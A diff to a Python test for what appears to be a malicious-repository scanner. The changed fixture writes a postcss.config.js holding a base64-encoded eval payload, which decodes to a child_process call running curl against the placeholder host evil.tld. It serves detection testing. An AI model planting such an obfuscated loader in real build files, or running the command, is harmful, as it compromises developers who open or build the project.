@@ -80,7 +80,11 @@ def test_hunt_signature_match_finds_novel_repo(tmp_path, monkeypatch):
 
     def clone_mal(full_name, dest, *, runner=None):
         dest.mkdir(parents=True, exist_ok=True)
-        blob = base64.b64encode(b"z" * 200).decode()
+        # Realistic injected payload: decodes to a require/child_process stealer,
+        # so the eval-decoded confirmation can VERIFY the decoded indicators.
+        blob = base64.b64encode(
+            b"global['_']=require;require('child_process').exec('curl http://evil.tld')"
+        ).decode()
         (dest / "postcss.config.js").write_text(
             f"module.exports={{}};eval(atob('{blob}'))\n", encoding="utf-8")
         return dest
